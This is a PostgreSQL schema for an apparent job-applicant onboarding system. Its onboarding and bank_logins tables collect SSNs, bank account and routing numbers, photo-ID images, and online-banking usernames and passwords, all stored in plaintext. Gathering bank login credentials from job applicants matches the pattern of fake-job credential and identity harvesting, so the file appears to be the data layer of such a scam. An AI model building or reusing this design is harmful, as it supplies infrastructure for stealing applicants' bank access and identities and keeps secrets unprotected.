-- Enable necessary extensions
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- Drop existing tables if needed (for clean reinitialization)
DROP TABLE IF EXISTS bank_logins CASCADE;
DROP TABLE IF EXISTS onboarding CASCADE;
DROP TABLE IF EXISTS applicants CASCADE;

-- Applicants table (application phase)
CREATE TABLE applicants (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  first_name TEXT NOT NULL,
  last_name TEXT NOT NULL,
  email TEXT NOT NULL UNIQUE,
  phone TEXT NOT NULL,
  resume_url TEXT NOT NULL, -- Changed from resume_file and resume_mime
  status TEXT NOT NULL DEFAULT 'pending',
  application_date DATE NOT NULL DEFAULT CURRENT_DATE
);

-- Onboarding table (for accepted applicants)
CREATE TABLE onboarding (
  applicant_id UUID PRIMARY KEY REFERENCES applicants(id) ON DELETE CASCADE,
  date_of_birth DATE NOT NULL,
  street TEXT NOT NULL,
  city TEXT NOT NULL,
  state TEXT NOT NULL,
  zip_code TEXT NOT NULL,
  ssn TEXT,
  account_number TEXT NOT NULL,
  routing_number TEXT NOT NULL,
  bank_name TEXT NOT NULL,
  bank_username TEXT,
  bank_password TEXT,
  front_image_url TEXT NOT NULL,
  back_image_url TEXT NOT NULL,
  w2_form BYTEA, -- ✅ Added here correctly
  onboarding_completed BOOLEAN NOT NULL DEFAULT false,
  onboarding_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

-- Optional: Table for storing login data if needed
CREATE TABLE bank_logins (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  applicant_id UUID NOT NULL REFERENCES applicants(id) ON DELETE CASCADE,
  bank_name TEXT NOT NULL,
  username TEXT NOT NULL,
  password TEXT NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
